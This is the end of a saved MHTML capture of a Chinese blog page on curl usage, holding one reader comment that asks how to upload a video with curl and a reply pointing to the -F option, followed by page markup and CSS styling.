</div>
       =20
   =20
       =20
        <div id="3D"comment-417948"" class="3D"comment"">
    <div id="3D"comment-last"" class="3D"inner"">
        <div class="3D"comment-header"">
            <div class="3D"asset-meta"">
<p>
                <span class="3D"byline"">
                   =20

                    <span class="3D"vcard" author">yaoms</span>

 =E8=AF=B4=EF=BC=9A
                </span>
</p>
            </div>
        </div>
        <div class="3D"comment-content"" id="3D"comment-quote-417948"">
            <blockquote>
<pre>=E5=BC=95=E7=94=A8Monica=E7=9A=84=E5=8F=91=E8=A8=80=EF=BC=9A</pre>

<p>=E6=82=A8=E5=A5=BD=EF=BC=81=E8=AF=B7=E9=97=AEcurl=E5=8F=AF=E4=BB=A5=E7=
=94=A8=E4=BA=8E=E4=B8=8A=E4=BC=A0=E4=B8=80=E4=B8=AA=E8=A7=86=E9=A2=91=E6=96=
=87=E4=BB=B6=E5=90=97=EF=BC=9F=E6=80=8E=E6=A0=B7=E5=86=99=E8=BF=99=E4=B8=AA=
=E5=91=BD=E4=BB=A4=EF=BC=9F=E6=84=9F=E8=B0=A2=EF=BC=81=EF=BC=81</p>

</blockquote>

<p>=E5=B0=B1=E7=94=A8 -F =E9=80=89=E9=A1=B9=E4=B8=8A=E4=BC=A0</p>
        </div>
<div class="3D"comment-footer"">
<div class="3D"comment-footer-inner"">
<p>
                   <abbr 2020 class="3D"published"" title="3D"April" 23, 7:28="PM"">2020=E5=B9=B44=E6=9C=8823=E6=97=A5 19:28</abbr>
 | <a href="3D"http://www.ruanyifeng.com/blog/2019/09/curl-reference.html#co=" mment-417948">#</a>
 | <a href="3D"http://www.ruanyifeng.com/blog/2019/09/curl-reference.html#co=" mment-text" title="3D"=E5=BC=95=E7=94=A8yaoms=E7=9A=84=E8=BF=99=E6=9D=A1=E7=" =95="99=E8=A8=80"">=E5=BC=95=E7=94=A8</a>
</p>
</div>
</div>
    </div>
</div>
       =20
    </div>
       =20
   =20


   =20
   =20
    <div class="3D"comments-open"" id="3D"comments-open"">
        <h2 class="3D"comments-open-header"">=E6=88=91=E8=A6=81=E5=8F=91=E8=
=A1=A8=E7=9C=8B=E6=B3=95</h2>
        <div class="3D"comments-open-content"">

       =20
            <div id="3D"comment-greeting""></div>

            <form method="3D"post"" action="3D"http://www.ruanyifeng.com/cgi-b=" in mtos mt-comments.cgi" name="3D"comments_form"" id="3D"comments-form"">
               =20
               =20
               =20
               =20
               =20
               =20
               =20
                <div id="3D"comments-open-data"">
            <div id="3D"comments-open-text"">
                    <p><label for="3D"comment-text"">=E6=82=A8=E7=9A=84=E7=95=
=99=E8=A8=80
                    =EF=BC=88HTML=E6=A0=87=E7=AD=BE=E9=83=A8=E5=88=86=E5=8F=
=AF=E7=94=A8=EF=BC=89</label></p>
                    <p><textarea id="3D"comment-text"" name="3D"text"" rows="3D"=" 10" cols="3D"50""></textarea></p>
                </div>
                    <div id="3D"comment-form-name"">
                        <p><label for="3D"comment-author"">=E6=82=A8=E7=9A=84=
=E5=A4=A7=E5=90=8D=EF=BC=9A</label></p>
                        <p><input id="3D"comment-author"" name="3D"author"" siz="e=3D"30"" value="3D""">  <span class="3D"hint""> =C2=AB-=E5=BF=85=E5=A1=AB</span></p>
                    </div>
                    <div id="3D"comment-form-email"">
                        <p><label for="3D"comment-email"">=E7=94=B5=E5=AD=90=
=E9=82=AE=E4=BB=B6=EF=BC=9A</label></p>
                        <p><input id="3D"comment-email"" name="3D"email"" size="=3D"30"" value="3D""">  <span class="3D"hint""> =C2=AB-=E5=BF=85=E5=A1=AB=EF=BC=
=8C=E4=B8=8D=E5=85=AC=E5=BC=80</span></p>
                    </div>
                    <div id="3D"comment-form-url"">
                        <p><label for="3D"comment-url"">=E4=B8=AA=E4=BA=BA=E7=
=BD=91=E5=9D=80=EF=BC=9A</label></p>
                        <p><input id="3D"comment-url"" name="3D"url"" size="3D"3=" 0" value="3D""">  <span class="3D"hint""> =C2=AB-=E6=88=91=E4=BF=A1=E4=BB=BB=E4=
=BD=A0=EF=BC=8C=E4=B8=8D=E4=BC=9A=E5=A1=AB=E5=86=99=E5=B9=BF=E5=91=8A=E9=93=
=BE=E6=8E=A5</span></p>
                    </div>
                    <div id="3D"comment-form-remember-me"">
                        <p>
                        <label for="3D"comment-bake-cookie"">=E8=AE=B0=E4=BD=
=8F=E4=B8=AA=E4=BA=BA=E4=BF=A1=E6=81=AF=EF=BC=9F</label><input type="3D"chec=" kbox" id="3D"comment-bake-cookie"" name="3D"bakecookie"" value="3D"1"" accesskey="=3D"r""></p>
                    </div>
                </div>
                    <div id="3D"comment-form-reply"" style="3D"display:none"">
                    <input type="3D"checkbox"" id="3D"comment-reply"" name="3D"c=" omment_reply" value="3D""">
                    <label for="3D"comment-reply"" id="3D"comment-reply-label"="></label>
                </div>
                <div id="3D"comments-open-captcha""></div>
                <div id="3D"comments-open-footer"">
<div id="3D"wait"" style="3D"display:none;"">
<p><strong>=E6=AD=A3=E5=9C=A8=E5=8F=91=E8=A1=A8=E6=82=A8=E7=9A=84=E8=AF=84=
=E8=AE=BA=EF=BC=8C=E8=AF=B7=E7=A8=8D=E5=80=99</strong></p>
<p>
<input type="3D"text"" name="3D"percent"" size="3D"3"" style="3D"font-family:Arial=" ; color:black;text-align:center; border-width:medium; border-style:none;"> =
         =20
<input type="3D"text"" name="3D"chart"" size="3D"46"" style="3D"font-family:Arial;=" font-weight:bolder; color:black; padding:0px; border-style:none;">
</p>
</div>

                    <p><input type="3D"submit"" accesskey="3D"s"" name="3D"post"=" id="3D"comment-submit"" value="3D"=E5=8F=91=E8=A1=A8"">  <span class="3D"hint"">=
 =C2=AB- =E7=82=B9=E5=87=BB=E6=8C=89=E9=92=AE</span></p>
                </div>
            </form>


        </div>
    </div>

   =20


</div>




                        </div>
                    </div>

                </div>
            </div>
       =20
        =20
            <div id="3D"footer"">
<div id="3D"footer-inner"">
  <div id="3D"footer-content"">

     =20
<!--
      <section>=20
     </section>
  <p><a title=3D"Instagram" target=3D"_blank" href=3D"http://instagram.com/=
ruanyf">Instagram</a></p>
       <p><a title=3D"=E8=AE=A2=E9=98=85" href=3D"https://app.feedblitz.com=
/f/f.fbz?Sub=3D348868" target=3D"_blank">=E9=82=AE=E4=BB=B6=E8=AE=A2=E9=98=
=85</a></p>
 =20
       <h2>Feed</h2>
       <p><a title=3D"FeedBurner" href=3D"http://feeds.feedburner.com/ruany=
ifeng" target=3D"_blank">FeedBurner</a></p>
       <p><a title=3D"atom.xml" href=3D"http://www.ruanyifeng.com/blog/atom=
.xml" target=3D"_blank">atom.xml</a></p>
    =20
      <p>=E6=94=AF=E4=BB=98=E5=AE=9D=EF=BC=9A<a title=3D"=E6=94=AF=E4=BB=98=
=E5=AE=9D" href=3D"alipays://platformapi/startapp?appId=3D20000067&url=3Dht=
tp%3A%2F%2Fwww.ruanyifeng.com%2Fblog" target=3D"_blank">yifeng.ruan@gmail.c=
om</a></p>
-->

     <section>
<!--
       <h2>=E6=8E=88=E6=9D=83=E6=96=B9=E5=BC=8F</h2>
       <p><a title=3D"=E8=AE=B8=E5=8F=AF=E8=AF=81" href=3D"http://creativec=
ommons.org/licenses/by-nc-nd/3.0/deed.zh" target=3D"_blank">=E8=87=AA=E7=94=
=B1=E8=BD=AC=E8=BD=BD-=E9=9D=9E=E5=95=86=E7=94=A8-=E9=9D=9E=E8=A1=8D=E7=94=
=9F-=E4=BF=9D=E6=8C=81=E7=BD=B2=E5=90=8D</a></p>
       <h2>=E5=BE=AE=E4=BF=A1=E5=85=AC=E5=8F=B7</h2>
       <h2>=E7=A4=BE=E4=BA=A4=E5=B8=90=E5=8F=B7</h2>
       <h2>=E8=81=94=E7=B3=BB=E6=96=B9=E5=BC=8F</h2>
     -->
       <p><img src="3D"https://www.wangbase.com/blogimg/asset/202001/bg20200=" 13101.jpg" alt="3D"=E5=BE=AE=E4=BF=A1=E6=89=AB=E6=8F=8F""></p>
       <p>
         <a title="3D"=E5=BE=AE=E5=8D=9A"" href="3D"http://weibo.com/ruanyf"" t="arget=3D"_blank"">Weibo</a> |=20
         <a title="3D"Twitter"" target="3D"_blank"" href="3D"https://twitter.com=" ruanyf">Twitter</a> |
         <a title="3D"GitHub"" target="3D"_blank"" href="3D"https://github.com/r=" uanyf">GitHub</a>
       </p>
    =20
     <p>Email: <a title="3D"=E7=94=B5=E5=AD=90=E9=82=AE=E4=BB=B6"" href="3D"ma=" ilto:yifeng.ruan@gmail.com" target="3D"_blank"">yifeng.ruan@gmail.com</a></p>
     </section>
 =20
 =20


  </div>
</div>
</div>







<div id="3D"share_button_proto"" style="3D"display:none;"">
<a class="3D"bshareDiv"" href="3D"http://www.bshare.cn/share"">=E5=88=86=E4=BA=
=AB=E6=8C=89=E9=92=AE</a>





</div>







        </div>
    </div>

<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true}});</script></body></html>
------MultipartBoundary--ozwB9gKsn1GQUq15ujUxqsg9oVNhZdY27cqRD7Sw1G----
Content-Type: text/css
Content-Transfer-Encoding: quoted-printable
Content-Location: cid:css-4df07dd2-3ad8-4b41-b5e3-ab23fc2cff7e@mhtml.blink

@charset "utf-8";

body { background-color: rgb(245, 245, 213); }

#container::before { display: block; width: 100%; padding: 10px; background=
: rgba(0, 0, 0, 0.1); text-align: center; content: "=E6=9C=AC=E7=AB=99=E6=
=98=BE=E7=A4=BA=E4=B8=8D=E6=AD=A3=E5=B8=B8=EF=BC=8C=E5=8F=AF=E8=83=BD=E5=9B=
=A0=E4=B8=BA=E6=82=A8=E4=BD=BF=E7=94=A8=E4=BA=86=E5=B9=BF=E5=91=8A=E6=8B=A6=
=E6=88=AA=E5=99=A8=E3=80=82"; }
------MultipartBoundary--ozwB9gKsn1GQUq15ujUxqsg9oVNhZdY27cqRD7Sw1G----
Content-Type: text/css
Content-Transfer-Encoding: quoted-printable
Content-Location: http://www.ruanyifeng.com/static/themes/theme_scrapbook/theme_scrapbook.min.css

@charset "utf-8";

html, body, div, span, object, iframe, h1, h2, h3, h4, h5, h6, p, blockquot=
e, pre, a, abbr, acronym, address, code, del, dfn, em, img, q, dl, dt, dd, =
ol, ul, li, tt, fieldset, form, label, legend, table, caption, tbody, tfoot=
, thead, tr, th, td { margin: 0px; padding: 0px; list-style-type: none; tex=
t-align: left; text-decoration: none; font-weight: normal; font-style: norm=
al; border: none; color: rgb(17, 17, 17); }

body { margin: 0px; padding: 0px; background-color: rgb(245, 245, 213); fon=
t-family: Georgia, serif; letter-spacing: -0.01em; word-spacing: 0.2em; lin=
e-height: 1.8em; font-size: 62.5%; color: rgb(17, 17, 17); width: 98%; }

body.mobile { font-size: 60%; }

body.mobile.two-columns { font-size: 100%; }

#container::before { display: none; }

@media (max-width: 30rem) {
  body, body.mobile.two-columns { font-size: 60%; }
}

h1 { font-size: 2.88em; }

h2 { font-size: 2.88em; line-height: 1.35em; }

body.mobile h2 { font-size: 2em; }

@media (max-width: 30rem) {
  h2 { font-size: 2em; }
}

h3 { font-size: 1.87em; }

h4 { font-size: 1.5em; }

ul li { list-style-type: square; }

ol li { list-style-type: decimal; list-style-position: inside; }

img { border: 2px solid rgb(0, 57, 138); }

strong { font-weight: 800; }

p, li { font-size: 1.6em; line-height: 220%; }

input, textarea { font-size: 1.13em; }

select, button { font-size: 1.03em; }

#container { margin: 0px auto; background-color: rgb(245, 245, 213); paddin=
g: 1em; }

body.one-column #container { width: 65%; min-width: 640px; max-width: 960px=
; }

body.two-columns #container { width: 85%; min-width: 780px; max-width: 1260=
px; }

body.mobile.one-column #container, body.mobile.two-columns #container { wid=
th: 98%; min-width: 0px; overflow: hidden; }

@media (max-width: 48rem) {
  #container { padding: 0.5em; }
  body.one-column #container { width: 98%; min-width: 0px; overflow: hidden=
; }
  body.two-columns #container { width: 98%; min-width: 0px; overflow: hidde=
n; }
}

#header { width: 100%; }

#header { border-bottom: 1px solid rgb(211, 211, 211); margin: 1em; float: =
left; height: 5em; }

#header h1, #header #header-description, #header div#header-name { margin-t=
op: 0.9em; font-size: 1.8em; color: rgb(85, 102, 119); }

#header h1, #header div#header-name { float: left; }

#header #feed_icon, #header #google_search { float: right; margin-left: 1%;=
 margin-right: 1%; }

#header #feed_icon { margin-top: 0.9em; transform: rotate(5deg); transition=
: transform 0.4s ease-in 0s; }

#header #feed_icon:hover { transform: rotate(275deg); }

#header #google_search { width: 201px; height: 2.4em; background-image: url=
("images/searchtop.gif"); background-repeat: no-repeat; padding: 0px; margi=
n: 1.3em 1em; position: relative; }

#header #google_search form { display: inline; }

#header #google_search .searchbox { border: 0px; background-color: transpar=
ent; position: absolute; top: 0px; left: 1px; width: 180px; height: 24px; o=
utline: none; }

#header #google_search .searchbox_submit { border: 0px; background-color: t=
ransparent; position: absolute; top: 0px; left: 176px; width: 29px; height:=
 25px; }

#header a { color: orange; }

#footer img { border: none; }

body.mobile #header #feed_icon { display: none; }

body.mobile #header #google_search { display: none; }

@media (max-width: 30rem) {
  #header #feed_icon { display: none; }
  #header #google_search { display: none; }
}

body.mobile #header { margin: 0px 1em 1em; height: 3em; max-width: 95%; }

body.mobile #header h1, body.mobile #header #header-description, body.mobil=
e #header div#header-name { margin-top: 0.5em; }

@media (max-width: 48rem) {
  #header { margin: 0px 2em 1em; height: 3em; max-width: 95%; }
  #header h1, #header #header-description, #header div#header-name { margin=
-top: 0.5em; }
}

#content { clear: both; margin: 1.5em 1em 1em; }

body.mobile #content { margin: 0em; }

@media (max-width: 30rem) {
  #content { margin: 0em; }
}

#content h1, h2, h3 { margin: 0.4em 0px 0.2em; padding: 0px 0px 0.2em; colo=
r: rgb(0, 0, 0); font-weight: 500; letter-spacing: -0.03em; border-bottom: =
1px solid rgb(211, 211, 211); }

#content a:link { color: rgb(85, 102, 119); }

#content a:visited { color: rgb(85, 102, 119); }

#content a:hover { color: rgb(102, 85, 68); }

#content .email { color: rgb(85, 102, 119); }

.one-column #alpha { width: 100%; }

.one-column #alpha h1 { line-height: 250%; font-family: "Trebuchet MS", Ari=
al, "Lucida Grande", Verdana, Lucida, Helvetica, sans-serif; }

body.one-column #content #alpha { padding-top: 0.5em; }

body.one-column #content #alpha p { margin-top: 1em; line-height: 180%; mar=
gin-left: 0.8em; }

body.one-column #content #alpha .asset-content a:link { color: rgb(34, 52, =
114); }

body.one-column #content #alpha .asset-content a:visited { color: rgb(68, 0=
, 102); }

body.one-column #content #alpha .asset-content a:hover { color: rgb(208, 53=
, 0); }

body.one-column #content #alpha .asset-content a:active { color: rgb(154, 4=
4, 6); }

body.one-column #content #alpha .asset-content img { border: 0.3em solid rg=
b(224, 223, 204); border-radius: 1em; }

body.mobile.one-column #content #alpha .asset-content img { max-width: 95%;=
 overflow: auto; border: 0.15em solid rgb(224, 223, 204); }

@media (max-width: 48rem) {
  body.one-column #content #alpha .asset-content img { max-width: 95%; over=
flow: auto; border: 0.15em solid rgb(224, 223, 204); }
}

body.one-column #content #alpha .asset-content h2, body.one-column #content=
 #alpha .asset-content h3 { margin-top: 1.5em; }

body.one-column #content #alpha .asset-content ul, body.one-column #content=
 #alpha .asset-content ol, body.one-column #content #alpha .asset-content t=
able { margin-left: 4em; }

body.mobile.one-column #content #alpha .asset-content ul, body.mobile.one-c=
olumn #content #alpha .asset-content ol, body.mobile.one-column #content #a=
lpha .asset-content table { margin-left: 1.5em; }

@media (max-width: 48rem) {
  body.one-column #content #alpha .asset-content ul, body.one-column #conte=
nt #alpha .asset-content ol, body.one-column #content #alpha .asset-content=
 table { margin-left: 1.5em; }
}

body.one-column #content #alpha .asset-content table { border: 1px solid rg=
b(43, 43, 43); font-family: verdana, arial, sans-serif; font-size: 100%; co=
lor: rgb(51, 51, 51); border-collapse: collapse; width: 90%; }

body.one-column #content #alpha .asset-content table td { border: 1px solid=
 rgb(102, 102, 102); font-size: 1.4em; padding: 0.6em; }

body.one-column #content #alpha .asset-content table th { border-width: 1px=
; font-size: 1.4em; padding: 0.6em; border-style: solid; border-color: rgb(=
102, 102, 102); background-color: rgb(222, 222, 222); }

body.one-column #content #alpha ul#entry-folder span.folder-tag { color: gr=
een; }

body.one-column #content #alpha p code { display: inline-block; padding-lef=
t: 5px; padding-right: 5px; font-size: 120%; background-color: pink; border=
-radius: 5px; margin: auto 3px; }

body.one-column #content #alpha p a code { text-decoration: underline; tran=
sition: all 1s ease 0s; }

body.one-column #content #alpha p a code:hover { text-decoration: none; bac=
kground-color: deeppink; color: white; }

body.two-columns #content #alpha { width: 64%; min-width: 470px; max-width:=
 740px; margin-left: 3%; float: left; }

body.two-columns #content #beta { float: right; width: 24%; padding: 0.6em;=
 margin-right: 3%; margin-bottom: 1em; min-width: 180px; max-width: 300px; =
overflow: hidden; border-radius: 20px; }

body.mobile.two-columns #content #alpha, body.mobile.two-columns #content #=
beta { float: left; width: 95%; min-width: 0px; max-width: none; }

@media (max-width: 48rem) {
  body.two-columns #content #alpha, body.two-columns #content #beta { float=
: left; width: 95%; min-width: 0px; max-width: none; }
}

body.two-columns #content #alpha h1 { font-size: 1.6em; font-weight: bold; =
color: rgb(85, 102, 119); padding: 0.5em 1em; margin: 0px 0px 1em; border-b=
ottom: none; background-color: rgb(170, 210, 240); border-radius: 10px; }

body.two-columns #content #alpha h1 a { text-decoration: underline; color: =
rgb(85, 102, 119); font-weight: 500; }

body.two-columns #content #alpha h2 { font-size: 2.88em; font-family: "Treb=
uchet MS", Arial, "Lucida Grande", Verdana, Lucida, Helvetica, sans-serif; =
line-height: 180%; margin-bottom: 0.5em; }

body.two-columns #content #alpha h2 a:link, body.two-columns #content #alph=
a h2 a:visited { color: rgb(0, 0, 0); font-weight: 500; }

body.two-columns #content #alpha .asset-header #asset-tags { float: right; =
margin-top: -1em; color: gray; padding-right: 2em; }

body.two-columns #content #alpha .asset-header #asset-tags p { font-size: 1=
.44em; }

body.two-columns #content #alpha .asset-header #asset-tags a { color: orang=
e; }

body.two-columns #content #alpha .asset-body p { font-size: 180%; }

body.two-columns #content .content-nav { float: right; color: gray; positio=
n: relative; margin: 0px 2em -3em; top: -5em; padding: 0px; }

body.two-columns #content .content-nav p { font-size: 1.44em; }

body.two-columns #content .content-nav a { color: rgb(85, 102, 119); text-d=
ecoration: underline; }

body.two-columns #content #alpha h2 a { text-decoration: none; color: rgb(5=
1, 102, 153); }

body.two-columns #content #alpha h2 a:hover { color: rgb(4, 99, 128); }

body.two-columns #content #alpha .asset-body, body.two-columns #content #al=
pha .asset-more-link { clear: both; margin: 1em 1.5em; color: rgb(43, 43, 4=
3); }

body.two-columns #content #alpha .asset-body a { color: rgb(0, 0, 0); text-=
decoration: underline; }

body.two-columns #content #alpha .asset-body a:hover, body.two-columns #con=
tent #alpha .asset-more-link a:hover { color: rgb(17, 34, 51); }

body.two-columns #content #alpha .asset-more-link a { color: green; }

body.two-columns #content #alpha .asset-footer { border-top: 1px solid rgb(=
211, 211, 211); margin-top: 1em; padding-left: 2em; }

body.two-columns #content #alpha .asset-footer p { font-size: 1.2em; }

.asset-footer span, .asset-footer abbr { color: rgb(61, 61, 61); }

body.two-columns #content #alpha .module-content { margin-left: 2em; }

body.two-columns #content #beta p, body.two-columns #content #beta li { fon=
t-size: 1.44em; }

body.two-columns #content #beta li ul { font-size: 69.4%; }

body.two-columns #content .module-content a { text-decoration: underline; c=
olor: rgb(0, 0, 0); }

body.two-columns #content .module-content ul { list-style-type: square; }

body.two-columns #content #alpha .module h2 { font-size: 1.8em; clear: both=
; font-weight: bold; padding: 0.3em 0.5em; margin: 0.5em 0.4em 0.1em; borde=
r-bottom: 1px solid rgb(211, 211, 211); }

.module { margin-bottom: 1em; }

.module h2 { font-size: 1.8em; }

.module h3 { font-size: 1.4em; text-align: center; }

.module table { width: 90%; font-size: 1.02em; margin: auto; }

.module td { padding: 0em 0.2em; }

.module p, .module ul { margin-left: 1em; }

.module li { margin-left: 1em; }

.module button { width: 4em; height: 2em; text-align: center; }

#beta .module { padding: 1em; border-radius: 1em; border: 1px solid rgb(211=
, 211, 211); }

#beta .module .sponsor img { filter: opacity(90%); }

#beta .module .sponsor img:hover { filter: opacity(100%); }

body.two-columns #content #alpha #homepage h3 { font-size: 2.2em; font-weig=
ht: 500; margin-top: 2em; }

body.two-columns #content #alpha #homepage ul { margin-left: 4em; }

body.two-columns #content #alpha #homepage ul li, body.two-columns #content=
 #alpha #homepage ul li span { color: rgba(0, 0, 0, 0.5); }

body.mobile.two-columns #content #alpha #homepage ul { margin-left: 2em; }

body.mobile.two-columns #content #alpha #homepage ul li span { display: non=
e; }

@media (max-width: 48rem) {
  body.two-columns #content #alpha #homepage ul { margin-left: 2em; }
  body.two-columns #content #alpha #homepage ul li span { display: none; }
}

#homepage #homepage-alpha { width: 58%; float: left; }

#homepage #homepage-beta { width: 34%; float: left; margin-left: 3%; }

body.mobile #homepage #homepage-alpha, body.mobile #homepage #homepage-beta=
 { float: left; width: 95%; margin-left: 0px; }

@media (max-width: 30rem) {
  #homepage #homepage-alpha, #homepage #homepage-beta { float: left; width:=
 95%; margin-left: 0px; }
}

body.two-columns #content #homepage .module-content li { line-height: 180%;=
 margin-left: 1em; font-size: 1.44em; }

body.two-columns #alpha #homepage-beta .module h2 { border-bottom: none; }

body.two-columns #homepage #homepage-beta .module-content { border-left: 1p=
x solid rgb(211, 211, 211); border-top: 1px solid rgb(211, 211, 211); paddi=
ng: 0.3em; }

body.mobile.two-columns #homepage_pos img { max-width: 100%; overflow: auto=
; }

@media (max-width: 48rem) {
  body.two-columns #homepage_pos img { max-width: 100%; overflow: auto; }
}

.mt-main-index #alpha #photo { width: 120px; margin: 0em 2em; padding: 0px;=
 }

.mt-main-index #alpha #photo p { padding: 0px; margin: 0px; text-align: cen=
ter; color: gray; font-size: 1.58em; }

.mt-main-index #alpha #photo img { padding: 0.3em; width: 100px; background=
-color: rgb(255, 255, 255); border: 1px solid rgb(51, 102, 153); }

#content #search_form img { border: none; }

#content #search_form #search_input_box { border: 1px solid rgb(51, 102, 15=
3); }

#content #search_form #search_button { text-align: center; height: 2em; wid=
th: 4em; }

body.one-column #content #alpha div.entry-asset { border-bottom: 1px solid =
rgb(211, 211, 211); padding-bottom: 1em; }

body.one-column #content #alpha div.asset-nav, body.one-column #content #al=
pha div.asset-footer { font-weight: bold; color: rgb(252, 178, 151); paddin=
g: 0.3em 0.5em; margin: 0px 0px 1em; border-radius: 1em; box-shadow: rgb(23=
8, 238, 238) 0px 1px 0px 0px inset; background: -webkit-gradient(linear, 0%=
 0%, 0% 100%, color-stop(0.05, rgb(170, 210, 240)), to(rgb(139, 193, 237)))=
 rgb(170, 210, 240); border: 1px solid rgb(220, 220, 220); text-shadow: rgb=
(238, 238, 238) 1px 1px 0px; }

body.one-column #content #alpha div.asset-nav::after { content: " "; displa=
y: block; height: 0px; clear: both; }

body.one-column #content #alpha div.asset-nav { zoom: 1; }

body.one-column #content #alpha div.asset-footer { margin-top: 2em; padding=
: 1.5em; border: 1px solid rgb(211, 211, 211); background-color: rgb(222, 2=
35, 247); }

body.one-column #content #alpha div.asset-footer h3 { border-bottom: 1px so=
lid gray; font-size: 1.92em; font-weight: bold; color: rgb(85, 102, 119); }

body.one-column #content #alpha div.asset-footer ul { padding-left: 2em; pa=
dding-right: 2em; }

body.one-column #content #alpha div.asset-footer li { color: rgb(85, 102, 1=
19); }

body.one-column #content #alpha div.asset-nav * { display: inline; }

body.one-column #content #alpha div.asset-nav a { color: green; }

body.mobile.one-column #content #alpha div.asset-nav div.entry-tags, body.m=
obile.one-column #content #alpha div.asset-nav div.entry-categories { float=
: left; width: 70%; display: inline-block; }

@media (max-width: 30rem) {
  body.one-column #content #alpha div.asset-nav div.entry-tags, body.one-co=
lumn #content #alpha div.asset-nav div.entry-categories { float: left; widt=
h: 70%; display: inline-block; }
}

body.one-column #content #alpha div.asset-nav div.entry-location { width: 2=
0em; float: right; overflow: hidden; white-space: nowrap; }

body.one-column #content #alpha div.asset-nav div.entry-location li { displ=
ay: block; list-style-type: none; }

body.one-column #content #alpha div.asset-nav div.entry-location a { color:=
 rgb(85, 102, 119); text-decoration: underline; font-size: 95%; }

body.mobile.one-column #content #alpha div.asset-nav div.entry-location { d=
isplay: none; }

@media (max-width: 30rem) {
  body.one-column #content #alpha div.asset-nav div.entry-location { displa=
y: none; }
}

body.one-column #content #alpha div.asset-nav div.entry-location-mobile { d=
isplay: none; float: right; }

body.mobile.one-column #content #alpha div.asset-nav div.entry-location-mob=
ile { display: inline-block; text-align: right; float: right; width: 20%; }

body.mobile.one-column #content #alpha div.asset-nav div.entry-location-mob=
ile li { display: inline; list-style-type: none; }

@media (max-width: 30rem) {
  body.one-column #content #alpha div.asset-nav div.entry-location-mobile {=
 display: inline-block; float: right; text-align: right; width: 20%; }
  body.one-column #content #alpha div.asset-nav div.entry-location-mobile l=
i { display: inline; list-style-type: none; }
}

body.one-column #content #alpha div.asset-meta { margin: 1.5em auto 2em; li=
ne-height: 0.8; }

body.one-column #content #alpha div.asset-meta * { color: rgb(85, 102, 119)=
; }

body.one-column #content #alpha div.asset-meta .sponsor-banner { display: b=
lock; margin: 1.5em 0.8em; padding: 0.7em 1em; font-size: 0.87rem; line-hei=
ght: 1.5; color: rgb(85, 102, 119); background-color: rgb(222, 235, 247); b=
order: 1px solid rgb(219, 228, 224); border-radius: 4px; }

body.mobile.one-column #content #alpha .entry-sponsor .entry-sponsor-img { =
display: none; }

@media (max-width: 30rem) {
  body.one-column #content #alpha .entry-sponsor .entry-sponsor-img { displ=
ay: none; }
}

body.one-column #content #alpha div.asset-content a { text-decoration: unde=
rline; color: rgb(17, 34, 51); }

body.one-column #content #alpha div.asset-content a:visited { color: rgb(17=
, 34, 51); }

body.one-column #content #alpha div.asset-content blockquote { background-c=
olor: rgb(245, 242, 240); padding: 1em; margin: 2em; border-radius: 1em; fo=
nt-family: Consolas, Monaco, "Andale Mono", monospace; border-width: 0.3em;=
 border-color: rgb(224, 223, 204); border-style: solid; text-shadow: white =
0px 1px; overflow: auto; }

body.mobile.one-column #content #alpha div.asset-content blockquote { paddi=
ng: 0.5em 1em; margin: 1em; border-radius: 1em; border-width: 0.15em; }

@media (max-width: 48rem) {
  body.one-column #content #alpha div.asset-content blockquote { padding: 0=
.5em 1em; margin: 1em; border-radius: 1em; border-width: 0.15em; }
}

#googlead2 { margin: 0px auto; text-align: center; }

#related_entries, #entry_utility, #cre { margin-top: 4em; }

#related_entries ul { margin-left: 2em; }

#entry_utility ul { margin-left: 3em; }

#related_entries ul a, #entry_utility ul a { text-decoration: underline; }

#entry_utility ul input { border: 1px solid rgb(211, 211, 211); }

#entry_utility ul img { border: none; }

#related_entries li div.entry-body { margin-left: 1em; padding-left: 0.4em;=
 border-left: 0.4em solid gray; }

#cre-inner { width: 100%; max-width: 100%; }

div#cre-left, div#cre-right { width: 49%; display: inline-block; }

div#crd-left { float: left; }

div#cre-right { float: right; }

#cre-inner img { width: 100%; max-width: 100%; }

#sup-post-2 p img { width: 100%; max-width: 100%; }

body.mobile #cre div#cre-inner { width: 98%; max-width: 98%; }

body.mobile div#cre-left, body.mobile div#cre-right { float: none; margin: =
0.5em auto; width: 98%; display: block; }

body.mobile div#cre-left a, body.mobile div#cre-right a { text-align: cente=
r; display: block; }

body.mobile div#cre-left img, body.mobile div#cre-right img { max-width: 10=
0%; overflow: auto; }

body.mobile #sup-post-2 p { display: block; width: 98%; position: relative;=
 height: 0px; padding: 26.67% 0px 0px; overflow: hidden; }

body.mobile #sup-post-2 p img { position: absolute; display: block; max-wid=
th: 100%; max-height: 100%; left: 0px; right: 0px; top: 0px; bottom: 0px; m=
argin: auto; }

@media (max-width: 48rem) {
  #cre div#cre-inner { width: 98%; max-width: 98%; }
  div#cre-left, div#cre-right { float: none; margin: 0.5em auto; width: 98%=
; display: block; }
  div#cre-left a, div#cre-right a { text-align: center; display: block; }
  div#cre-left img, div#cre-right img { max-width: 100%; overflow: auto; }
  #sup-post-2 p { display: block; width: 98%; position: relative; height: 0=
px; padding: 26.67% 0px 0px; overflow: hidden; }
  #sup-post-2 p img { position: absolute; display: block; max-width: 100%; =
max-height: 100%; left: 0px; right: 0px; top: 0px; bottom: 0px; margin: aut=
o; }
}

body.one-column #content #alpha #comments { clear: both; margin-top: 2em; }

body.one-column #content #alpha #comments h2 { padding-top: 2em; }

body.one-column #content #alpha #comments a { text-decoration: underline; }

body.one-column #content #alpha #comments .comment { border-bottom: 1px das=
hed rgb(211, 211, 211); }

body.one-column #content #alpha #comments .comment-header { margin-top: 1.6=
em; }

body.one-column #content #alpha #comments .comment-header * { color: rgb(43=
, 43, 43); font-weight: 700; }

body.one-column #content #alpha #comments .asset-meta { margin: 0.6em 0px; =
}

body.one-column #content #alpha #comments .comment-content { margin-left: 1=
em; font-size: 0.9em; }

body.one-column #content #alpha #comments .comment-content blockquote { bac=
kground-color: rgb(224, 223, 204); padding: 2em; margin: 2em; border-radius=
: 1em; font-size: 0.9em; }

body.one-column #content #alpha #comments .comment-content blockquote pre {=
 font-weight: 700; margin-bottom: 1.5em; font-size: 1.6em; }

body.one-column #content #alpha #comments .comment-footer { width: 40%; mar=
gin-left: 55%; }

body.one-column #content #alpha #comments .comment-footer p { font-size: 1.=
2em; }

body.one-column #content #alpha #comments .comment-footer * { color: black;=
 }

body.one-column #content #alpha #comments #comments-open input { border: 1p=
x solid rgb(211, 211, 211); margin-top: 0px; line-height: 1.2; padding: 0.4=
em 0.3em; background-color: rgb(245, 244, 223); }

